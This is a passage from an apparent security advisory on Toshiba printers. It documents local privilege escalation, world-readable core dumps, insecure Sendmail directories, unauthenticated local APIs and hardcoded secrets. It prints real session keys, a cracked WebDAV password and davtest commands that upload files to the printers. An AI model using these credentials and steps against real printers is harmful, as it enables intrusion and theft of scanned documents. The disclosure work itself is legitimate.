Usage: /usr/bin/sperl5.10.1-17 [switches] [--] [programfile] [arguments]
  -0[octal]         specify record separator (\0, if no argument)
  -a                autosplit mode with -n or -p (splits $_ into @F) 
  -C[number/list]   enables the listed Unicode features
  -c                check syntax only (runs BEGIN and CHECK blocks)
  -d[:debugger]     run program under debugger
  -D[number/list]   set debugging flags (argument is a bit mask or alphabets)
  -e program        one line of program (several -e's allowed, omit programfile)
  -E program        like -e, but enables all optional features
  -f                don't do $sitelib/sitecustomize.pl at startup
  -F/pattern/       split() pattern for -a switch (//'s are optional)
  -i[extension]     edit &lt;&gt; files in place (makes backup if extension supplied)
  -Idirectory       specify @INC/#include directory (several -I's allowed)
  -l[octal]         enable line ending processing, specifies line terminator
  -[mM][-]module    execute "use/no module..." before executing program
  -n                assume "while (&lt;&gt;) { ... }" loop around program
  -p                assume loop like -n but print line also, like sed 
  -P                run program through C preprocessor before compilation
  -s                enable rudimentary parsing for switches after programfile
  -S                look for programfile using PATH environment variable
  -t                enable tainting warnings
  -T                enable tainting checks
  -u                dump core after parsing program
  -U                allow unsafe operations
  -v                print version, subversion (includes VERY IMPORTANT perl info)
  -V[:variable]     print configuration summary (or a single Config.pm variable)
  -w                enable many useful warnings (RECOMMENDED)
  -W                enable all warnings
  -x[directory]     strip off text before #!perl line and perhaps cd to directory
  -X                disable all warnings

bash-4.1#
</code></pre>
<p>A local attacker can get root privileges.</p>
<p><a id="insecure-core-files"></a></p>
<h2>Details - Insecure permissions for core files</h2>
<p>It was observed that all the Toshiba printers contain coredump binaries in <code>/work/log/platform/syscallerr/gdb_backtraces</code>. These files have incorrect permissions; any local attacker can read and/or modify these files. These files contain the memory dump when the programs crashed and contain sensitive files (scanned files, printed files, and clear-text credentials):</p>
<p>Content of <code>/work/log/platform/syscallerr/gdb_backtraces</code>:</p>
<pre><code>bash-4.1# ls -la /work/log/platform/syscallerr/gdb_backtraces/ 
total 176
drwxrwxrwx 2 root root  4096 Apr 11 19:48 .
drwxrwxrwx 3 root root  4096 Apr  6  2016 ..
-rwxrwxrwx 1 root root 34651 Mar 23 20:27 core.alhp9100.4104.MFP14130119.1679583349_backtrace
-rwxrwxrwx 1 root root  2440 Mar 23 20:27 core.alipp.4825.MFP14130119.1679583369_backtrace
-rwxrwxrwx 1 root root  1007 Mar 23 20:26 core.bash.17184.MFP14130119.1679583274_backtrace
-rwxrwxrwx 1 root root  1729 Mar 23 20:26 core.curl.17593.MFP14130119.1679583273_backtrace
-rwxrwxrwx 1 root root   679 Mar 23 20:27 core.dibbler-client.3219.MFP14130119.1679583329_backtrace
-rwxrwxrwx 1 root root  1554 Mar 23 20:27 core.httpd.17263.MFP14130119.1679583348_backtrace
-rwxrwxrwx 1 root root  1514 Mar 23 20:27 core.httpd.17339.MFP14130119.1679583357_backtrace
-rwxrwxrwx 1 root root  3099 Mar 23 20:27 core.httpd.5108.MFP14130119.1679583307_backtrace
-rwxrwxrwx 1 root root  1140 Mar 23 20:27 core.httpd.5119.MFP14130119.1679583308_backtrace
-rwxrwxrwx 1 root root  1140 Mar 23 20:27 core.httpd.5120.MFP14130119.1679583310_backtrace
-rwxrwxrwx 1 root root  1302 Mar 23 20:27 core.httpd.5121.MFP14130119.1679583304_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5122.MFP14130119.1679583374_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5124.MFP14130119.1679583309_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5126.MFP14130119.1679583330_backtrace
-rwxrwxrwx 1 root root  1513 Mar 23 20:27 core.httpd.5127.MFP14130119.1679583372_backtrace
-rwxrwxrwx 1 root root  1140 Mar 23 20:27 core.httpd.5128.MFP14130119.1679583306_backtrace
-rwxrwxrwx 1 root root 24384 Apr 11 19:48 core.httpd_worker.8272.MFP14130119.1681135080_backtrace
-rwxrwxrwx 1 root root 17882 Mar 23 20:27 core.mapper.1572.MFP14130119.1679583311_backtrace
-rwxrwxrwx 1 root root  1673 Mar 23 20:27 core.nqcs.4048.MFP14130119.1679583366_backtrace
-rwxrwxrwx 1 root root  1025 Mar 23 20:27 core.sendmail.3868.MFP14130119.1679583366_backtrace
-rwxrwxrwx 1 root root  1226 Mar 23 20:26 core.sh.17183.MFP14130119.1679583274_backtrace
-rwxrwxrwx 1 root root  1080 Mar 23 20:27 core.slpd.4475.MFP14130119.1679583369_backtrace
-rwxrwxrwx 1 root root  5025 Mar 23 20:26 core.snmpd.4229.MFP14130119.1679583274_backtrace
-rwxrwxrwx 1 root root  1068 Mar 23 20:27 core.vsftpd.4033.MFP14130119.1679583366_backtrace
bash-4.1#
</code></pre>
<p>A local attacker can steal confidential information.</p>
<p><a id="lpe-sendmail"></a></p>
<h2>Details - Insecure permissions used for Sendmail - Local Privilege Escalation</h2>
<p>It was observed that all the Toshiba printers use Sendmail to send emails to recipients.</p>
<p>Sendmail is used with several insecure directories:</p>
<ul>
<li><code>/work/ci/tmp</code> to store temporary configuration files for Sendmail, this directory has dangerous permissions (777), as shown below in the logs of Sendmail.</li>
<li><code>/var/spool/clientmqueue</code> to store emails, this directory has dangerous permissions, as shown below in the logs of Sendmail.</li>
</ul>
<p>Content of <code>/ramdisk/al/network/log/maillog</code>:</p>
<pre><code>2023-04-14T19:59:58.973687+12:00 localhost faxmilter[4069]: call the smfi_main function
2023-04-14T21:07:31.005288+12:00 localhost sendmail[10814]: /work/ci/tmp/Config5564fde0-02e5-4e85-a5ff-0937a7de150a.cf: WARNING: dangerous write permissions
2023-04-14T21:07:31.035657+12:00 localhost sendmail[10814]: dangerous permissions=40777 on queue directory /var/spool/clientmqueue/
2023-04-14T21:07:31.140713+12:00 localhost sendmail[10814]: 12A91D0a561921: from=test@test-smtp.org, size=312413, class=0, nrcpts=1, msgid=&lt;TTEC89704647-f3b3-4f31-b9c5-348f90ae72f8@hostname&gt;, relay=root@localhost
</code></pre>
<p>A local attacker can inject a malicious Sendmail configuration file and get Remote Code Execution as root.</p>
<p>A local attacker can inject a malicious scanned file.</p>
<p>A local attacker can steal confidential information.</p>
<p><a id="hardcoded-keys-python"></a></p>
<h2>Details - Hardcoded keys found in Python applications used to generate authentication cookies</h2>
<p>It was observed that all the Toshiba printers use Python programs running as WSGI applications to provide dynamic web APIs. These APIs provide, for example, remote administration to the printers.</p>
<p>It appears that some hardcoded keys are used for authentication within Pyramid. Knowing these private keys may allow attackers to bypass authentication and reach administrative interfaces:</p>
<ul>
<li>Settingapp WSGI program</li>
<li>HomeApp WSGI program</li>
<li>WebServerApp WSGI program</li>
</ul>
<p>Hardcoded keys:</p>
<pre><code>/home/SYSROM_SRC/build/release/webframework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/home/SYSROM_SRC/build/release/webframework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
/home/SYSROM_SRC/build/release/framework/webserverapp/development.ini:session.secret = ZV2ViU2VydmVyQXBwZ
/home/SYSROM_SRC/build/release/framework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/home/SYSROM_SRC/build/release/framework/settingapp/development_sapp.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/home/SYSROM_SRC/build/release/framework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
/application/webframework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/application/webframework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
/application/framework/webserverapp/development.ini:session.secret = ZV2ViU2VydmVyQXBwZ
/application/framework/settingapp/development.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/application/framework/settingapp/development_sapp.ini:session.secret = Ecp2FBapEeWjWwAMKRj
/application/framework/homeapp/development.ini:session.secret = RkoKjLoUEeWkjwAMKRj
</code></pre>
<p>Such apps are directly reachable due to the use of Apache as a reverse proxy.</p>
<p>For example, to reach the SettingApp, it is possible to send HTTP request to <code>/aplpx/</code>:</p>
<p>Content of <code>/encryption/al/network/config/httpd.conf</code>:</p>
<pre><code>[...]
1146 ProxyPass /aplpx/ http://localhost:50184/
1147 ProxyPassReverse /aplpx/ http://localhost:50184/
[...]
</code></pre>
<p>A remote attacker can bypass authentication in remote applications.</p>
<p><a id="lpe-webpanel"></a></p>
<h2>Details - Lack of authentication in WebPanel - Local Privilege Escalation</h2>
<p>It was observed that all the Toshiba printers use Python programs running as WSGI applications to provide dynamic web APIs. These APIs provide, for example, remote administration to the printers.</p>
<p>One of these applications is the WebPanel, binding to the localhost interface on port 50180/tcp. This program provides API without authentication. A local attacker can change the configuration of the printer without authentication by reaching these routes located inside <code>/devicecontrol</code>:</p>
<p>Content of <code>/registration/al/WebPanel/wpserver/screenfacade/devicecontrol/__init__.py</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  <span style="color: #666666">1</span> <span style="color: #408080; font-style: italic">#! /usr/bin/env python</span>
  <span style="color: #666666">2</span> <span style="color: #408080; font-style: italic"># -*- coding: utf-8 -*-</span>
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">import</span> <span style="color: #0000FF; font-weight: bold">logging</span>
  <span style="color: #666666">4</span>
  <span style="color: #666666">5</span> <span style="color: #008000; font-weight: bold">from</span> <span style="color: #0000FF; font-weight: bold">pyramid.config</span> <span style="color: #008000; font-weight: bold">import</span> Configurator
  <span style="color: #666666">6</span>
  <span style="color: #666666">7</span> log <span style="color: #666666">=</span> logging<span style="color: #666666">.</span>getLogger(<span style="color: #BA2121">&quot;wpserver&quot;</span>)
  <span style="color: #666666">8</span>
  <span style="color: #666666">9</span>
 <span style="color: #666666">10</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">includeme</span>(config):
 <span style="color: #666666">11</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;includeme:ENTER&quot;</span>)
 <span style="color: #666666">12</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;init_powercontrol&#39;</span>, <span style="color: #BA2121">&#39;initPowerControl&#39;</span>)
 <span style="color: #666666">13</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;powercontrol_mode&#39;</span>, <span style="color: #BA2121">&#39;PowercontrolMode&#39;</span>)
 <span style="color: #666666">14</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;turn_on_led&#39;</span>, <span style="color: #BA2121">&#39;turnOnLED&#39;</span>)
 <span style="color: #666666">15</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;turn_off_led&#39;</span>, <span style="color: #BA2121">&#39;turnOffLED&#39;</span>)
 <span style="color: #666666">16</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_screen&#39;</span>, <span style="color: #BA2121">&#39;invokeScreen&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">17</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_popup_window&#39;</span>, <span style="color: #BA2121">&#39;invokePopupWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">18</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_auth_popup_window&#39;</span>, <span style="color: #BA2121">&#39;invokeAuthPopupWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">19</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_auth_popupwindowwith_permissions&#39;</span>, <span style="color: #BA2121">&#39;invokeAuthPopupWindowWithPermissions&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">20</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;start_rotatepolygon&#39;</span>, <span style="color: #BA2121">&#39;startRotatePolygon&#39;</span>)
 <span style="color: #666666">21</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;start_fuserheating&#39;</span>, <span style="color: #BA2121">&#39;startFuserHeating&#39;</span>)
 <span style="color: #666666">22</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;start_fuserheating_rotatepolygon&#39;</span>, <span style="color: #BA2121">&#39;startFuserHeatingRotatePolygon&#39;</span>)
 <span style="color: #666666">23</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_popup_screen&#39;</span>, <span style="color: #BA2121">&#39;invokePopupScreen&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">24</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;invoke_drawer_window&#39;</span>, <span style="color: #BA2121">&#39;invokeDrawerWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">25</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;blink_led&#39;</span>, <span style="color: #BA2121">&#39;blinkLED&#39;</span>)
 <span style="color: #666666">26</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;get_device_running_status&#39;</span>, <span style="color: #BA2121">&#39;getDeviceRunningStatus&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">27</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;get_drawer_information&#39;</span>, <span style="color: #BA2121">&#39;getDrawerInformation&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">28</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;lock_keys_withid&#39;</span>, <span style="color: #BA2121">&#39;lockKeysWithID&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">29</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;unlock_keys_withid&#39;</span>, <span style="color: #BA2121">&#39;unLockKeysWithID&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">30</span>     config<span style="color: #666666">.</span>add_route(<span style="color: #BA2121">&#39;show_sharedhome_window&#39;</span>, <span style="color: #BA2121">&#39;showSharedHomeWindow&#39;</span>, xhr<span style="color: #666666">=</span><span style="color: #008000">True</span>)
 <span style="color: #666666">31</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;includeme:EXIT&quot;</span>)
 <span style="color: #666666">32</span>
 <span style="color: #666666">33</span>
 <span style="color: #666666">34</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">main</span>(global_config, <span style="color: #666666">**</span>settings):
 <span style="color: #666666">35</span>     <span style="color: #BA2121">&quot;&quot;&quot; This function returns a Pyramid WSGI application.</span>
<span style="color: #BA2121"> 36     &quot;&quot;&quot;</span>
 <span style="color: #666666">37</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;main:ENTER&quot;</span>)
 <span style="color: #666666">38</span>     config <span style="color: #666666">=</span> Configurator(settings<span style="color: #666666">=</span>settings)
 <span style="color: #666666">39</span>     config<span style="color: #666666">.</span>include(includeme, route_prefix<span style="color: #666666">=</span><span style="color: #BA2121">&#39;/devicecontrol&#39;</span>)
 <span style="color: #666666">40</span>     config<span style="color: #666666">.</span>add_static_view(<span style="color: #BA2121">&#39;static&#39;</span>, <span style="color: #BA2121">&#39;prototype&#39;</span>, cache_max_age<span style="color: #666666">=3600</span>)
 <span style="color: #666666">41</span>     config<span style="color: #666666">.</span>scan(<span style="color: #BA2121">&#39;devicecontrol&#39;</span>)
 <span style="color: #666666">42</span>     log<span style="color: #666666">.</span>info(<span style="color: #BA2121">&quot;main:EXIT&quot;</span>)
 <span style="color: #666666">43</span>     <span style="color: #008000; font-weight: bold">return</span> config<span style="color: #666666">.</span>make_wsgi_app()
</pre></div>

<p>246 routes are defined in Python scripts inside the WebPanel, listening on port 50180, without authentication:</p>
<p>API access without authentication:</p>
<pre><code>./wpserver/eventmanagement/__init__.py:    config.add_route('sse_event_start', 'sseEventStart')
./wpserver/eventmanagement/__init__.py:    config.add_route('sse_event_stop', 'sseEventStop')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('user_login_required', 'userLoginRequired', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('authenticate_user', 'authenticateUser', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('async_Authenticate_Check', 'asyncAuthenticateCheck', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('change_user_password', 'changePassword', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('user_log_out', 'userLogOut', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_dept_code', 'setDeptCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('get_diagnostic_code', 'getDiagnosticCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('register_user', 'registerUser')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_pincode', 'loginByPinCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_pincode_external', 'loginByPinCodeExternal')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_cardid', 'loginByCardId')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_cardid_external', 'loginByCardIdExternal')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_card_pincode', 'loginByCardIdAndPinCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('login_by_card_pin_external', 'loginByCardIdAndPinExternal')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('project_management_setting', 'projectManagementSetting')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('project_management_operations', 'projectOperations')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('card_swipe_event_subscribe', 'CardSwipeEventSubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('card_swipe_event_unsubscribe', 'CardSwipeEventUnsubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('job_status_blink_event_subscribe', 'JobStatusBlinkEventSubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('job_status_blink_event_unsubscribe', 'JobStatusBlinkEventUnsubscribe')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_pin_code', 'setPinCode')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_swipe_event', 'setSwipeEvent')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('set_remote_scan', 'setRemoteScan')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('validate_credential', 'validateCredential')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('authenticate_by_smtp_ldap', 'authenticateBySmtporLdap')
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('validate_temp_login_admin', 'validateTempLoginAdmin', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('get_display_settings', 'getDisplaySettings', xhr=True)
./wpserver/screenfacade/authentication/__init__.py:    config.add_route('after_login_success_checks', 'afterLoginSuccessChecks', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('set_inactive_mode', 'setInactiveMode', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('set_active_mode', 'setActiveMode', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('init_department_code', 'initDepartmentCode', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('get_current_language', 'getCurrentLanguage', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('update_paramters_for_coincontroller', 'updateCoinControllerParameters', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('pause_auto_clear_timer', 'pauseAutoClearTimer', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('resume_auto_clear_timer', 'resumeAutoClearTimer', xhr=True)
./wpserver/screenfacade/basepanel/__init__.py:    config.add_route('control_power_key', 'controlPowerKey', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_jobstatus', 'initJobstatus', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_log_auth','getLogAuthentication')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_suspended_job_details', 'getSuspendedJobDetails', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('re_init_jobstatus', 'reInitJobstatus', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_sync_mode','getSyncMode')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_jobstatus_jobs', 'initJobStatusJobs', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_count_wfid', 'getTotalJobs', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_print_job', 'getPrintJobList', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('update_print_parameter','updateSuspendedJobData')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('jobs_start_hard_key','jobsStartHardKey')
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_scan_job', 'getScanJobList', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_fax_jobs', 'initFaxJobs', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('get_fax_job', 'getFaxJobList', xhr=True)
./wpserver/screenfacade/jobstatus/__init__.py:  config.add_route('init_jobstatus_logs', 'initJobStatusLogs', xhr=True)
[...]
</code></pre>
<p>These routes are used for internal communications from localhost without authentication.</p>
<p>Content of <code>/work/log/al/httpd_wsgi_access.log</code>:</p>
<pre><code>127.0.0.1 - - [25/Apr/2023:13:17:38 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=FunctionClear HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:26 +0530] "GET /wpserver/home/getLoginData?_=1682332768396 HTTP/1.1" 200 1289
127.0.0.1 - - [25/Apr/2023:13:18:26 +0530] "GET /wpserver/statusbar/statusBarEventUnsubscribe?_=1682332768397 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:26 +0530] "GET /wpserver/statusbar/statusBarEventSubscribe?_=1682332768398 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/home/initHomeScreen?defaultMenu=undefined&amp;_=1682332768399 HTTP/1.1" 200 9648
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/home/getRemainingTiles?userType=Public&amp;selectedTileSize=large&amp;_=1682332768400 HTTP/1.1" 200 16
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/devicecontrol/turnOnLED?key=Start HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:18:27 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=FunctionClear HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:19:12 +0530] "GET /wpserver/devicecontrol/invokeScreen?screen=JobStatus&amp;_=1682332768401 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:01 +0530] "GET /wpserver/home/getLoginData?_=1682332768402 HTTP/1.1" 200 1444
127.0.0.1 - - [25/Apr/2023:13:20:02 +0530] "GET /wpserver/statusbar/statusBarEventUnsubscribe?_=1682332768403 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:02 +0530] "GET /wpserver/statusbar/statusBarEventSubscribe?_=1682332768404 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:02 +0530] "GET /wpserver/home/initHomeScreen?defaultMenu=undefined&amp;_=1682332768405 HTTP/1.1" 200 9648
127.0.0.1 - - [25/Apr/2023:13:20:03 +0530] "GET /wpserver/home/getRemainingTiles?userType=Public&amp;selectedTileSize=large&amp;_=1682332768406 HTTP/1.1" 200 16
127.0.0.1 - - [25/Apr/2023:13:20:03 +0530] "GET /wpserver/devicecontrol/turnOnLED?key=Start HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:20:03 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=FunctionClear HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:52:03 +0530] "GET /wpserver/devicecontrol/invokeScreen?screen=JobStatus&amp;_=1682332768407 HTTP/1.1" 200 2
127.0.0.1 - - [25/Apr/2023:13:52:30 +0530] "GET /wpserver/print/initPrintJob?_=1682332768408 HTTP/1.1" 200 1398
127.0.0.1 - - [25/Apr/2023:13:52:30 +0530] "GET /wpserver/devicecontrol/turnOffLED?key=Start HTTP/1.1" 200 2
</code></pre>
<p>For example, a local attacker can reach these APIs without authentication:</p>
<pre><code>bash-4.1# curl "http://127.0.0.1:50180/wpserver/devicecontrol/turnOffLED?key=FunctionClear"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100     2  100     2    0     0      2      0  0:00:01 --:--:--  0:00:01   166
OK
</code></pre>
<p>A local attacker can bypass authentication in applications, providing administrative access.</p>
<p><a id="hardcoded-credentials-webdav"></a></p>
<h2>Details - Hardcoded credentials for WebDAV access</h2>
<p>It was observed that all the Toshiba printers contain credentials used for WebDAV access in the world-readable file <code>/home/SYSROM_SRC/data/passwords</code>:</p>
<pre><code>bash-4.1# ls -la /home/SYSROM_SRC/data/passwords
-rw-rw-rw- 1 root trusted 42 Jan 18  2022 /home/SYSROM_SRC/data/passwords
bash-4.1# cat /home/SYSROM_SRC/data/passwords
EBX:$apr1$wQYd9W5O$wDKvnN4Ij34hwvTiohAka.
</code></pre>
<p>It is possible to crack this hash with John:</p>
<pre>
kali% john passwd.toshiba
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
<font color=red>toshiba          (EBX)     </font>
1g 0:00:00:00 DONE 2/3 (2023-03-09 09:22) 11.11g/s 36022p/s 36022c/s 36022C/s keller..karla
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
kali%
</pre>

<p>Then, for firmware versions released by 2020, it is possible to get a full access with WebDAV to the printer.</p>
<p>Such access was successfully done against printers running the firmware versions T373HD0W1054, T410HD0W1073, TB01HD0W1610 and TG01HD0W1610:</p>
<pre><code>kali% davtest -url http://10.0.0.1:8080/storage/box/ITUTBoxes
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://10.0.0.1:8080/storage/box/ITUTBoxes  Server response: 405 Method Not Allowed
kali% davtest -url http://EBX:toshiba@10.0.0.1:8080/storage/box/ITUTBoxes
********************************************************
 Testing DAV connection
OPEN            FAIL:   http://EBX:toshiba@10.0.0.1:8080/storage/box/ITUTBoxes      Server response: 405 Method Not Allowed
kali% davtest -url http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/    
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes
********************************************************
NOTE    Random string for this session: SIX4x_ZkORvv
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv
********************************************************
 Sending test files
PUT     aspx    SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.aspx
PUT     asp     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.asp
PUT     jhtml   SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jhtml
PUT     txt     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.txt
PUT     cfm     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cfm
PUT     pl      SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.pl
PUT     shtml   SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.shtml
PUT     php     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.php
PUT     jsp     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.jsp
PUT     cgi     SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.cgi
PUT     html    SUCCEED:        http://EBX:toshiba@10.0.0.1:8080/EFilingBoxes/DavTestDir_SIX4x_ZkORvv/davtest_SIX4x_ZkORvv.html
********************************************************
 Checking for test file execution
EXEC    aspx    FAIL
EXEC    asp     FAIL
EXEC    jhtml   FAIL
